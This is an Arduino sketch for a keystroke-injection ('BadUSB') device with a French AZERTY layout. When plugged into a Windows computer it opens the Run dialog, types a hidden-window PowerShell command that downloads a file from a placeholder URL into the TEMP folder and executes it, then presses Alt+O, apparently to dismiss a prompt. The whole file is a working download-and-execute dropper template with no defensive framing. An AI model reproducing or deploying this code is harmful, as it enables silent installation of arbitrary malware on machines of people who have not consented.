#include <KeyboardAzertyFr.h>

void typeKey(uint8_t key)
{
  KeyboardAzertyFr.press(key);
  delay(50);
  KeyboardAzertyFr.release(key);
}

/* Init function */
void setup()
{
  // Begining the KeyboardAzertyFr stream
  KeyboardAzertyFr.begin();

  // Wait 500ms
  delay(500);
  
  KeyboardAzertyFr.press(KEY_LEFT_GUI);
  KeyboardAzertyFr.press('r');
  KeyboardAzertyFr.releaseAll();

  delay(200);
  KeyboardAzertyFr.print(F("powershell -WindowStyle Hidden -command \"cd $env:TEMP; Invoke-WebRequest -Uri 'FILE_URL' -OutFile 'FILE_NAME'; Start-Process -Filepath 'FILE_NAME'; exit\""));
  typeKey(KEY_RETURN);

  delay(2000);
  
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.press('o');
  KeyboardAzertyFr.releaseAll();

  // Ending stream
  KeyboardAzertyFr.end();
}

/* Unused endless loop */
void loop() {}
